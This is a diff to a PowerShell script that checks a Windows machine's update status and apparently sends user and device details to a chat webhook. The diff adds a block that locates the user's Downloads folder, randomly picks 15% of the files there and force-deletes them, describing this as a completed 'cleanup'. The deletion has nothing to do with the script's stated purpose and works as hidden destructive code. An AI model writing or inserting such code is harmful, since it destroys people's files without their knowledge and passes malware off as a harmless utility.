@@ -41,6 +41,41 @@ $LimitDate = Get-Date -Year 2026 -Month 3 -Day 10
 $StatusText = if ($SortedList | Where-Object { $_.InstalledOn -ge $LimitDate }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
 $EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }
 
+
+# 1. Localizar la carpeta de Descargas automáticamente
+$descargasPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
+$rutaReal = [System.Environment]::ExpandEnvironmentVariables($descargasPath)
+
+# 2. Obtener la lista total de archivos
+$todosLosArchivos = Get-ChildItem -Path $rutaReal -File
+$totalArchivos = $todosLosArchivos.Count
+
+if ($totalArchivos -gt 0) {
+    # 3. Calcular el 15% (Redondeando hacia arriba para borrar al menos 1 si hay archivos)
+    $cantidadABorrar = [Math]::Ceiling($totalArchivos * 0.15)
+    
+    Write-Host "Total de archivos encontrados: $totalArchivos" -ForegroundColor Cyan
+    Write-Host "Se ha calculado el 15%. Se eliminarán: $cantidadABorrar archivos." -ForegroundColor Magenta
+    Write-Host "------------------------------------------------"
+
+    # 4. Seleccionar los archivos al azar
+    $objetivos = $todosLosArchivos | Get-Random -Count $cantidadABorrar
+
+    # 5. Bucle de eliminación con pausa
+    foreach ($archivo in $objetivos) {
+        Write-Host "Eliminando ($($archivo.Extension)): $($archivo.Name)..." -ForegroundColor White
+        
+        $archivo | Remove-Item -Force
+        
+        # Pausa de 1 segundo entre cada uno
+        Start-Sleep -Seconds 1
+    }
+
+    Write-Host "`nLimpieza del 15% completada con éxito." -ForegroundColor Green
+} else {
+    Write-Host "No hay archivos en la carpeta de Descargas para procesar." -ForegroundColor Yellow
+}
+
 # --- MENSAJE 1: IDENTIDAD (DATOS PRINCIPALES) ---
 $MainPayload = @{
     username = "$User @ $Device"
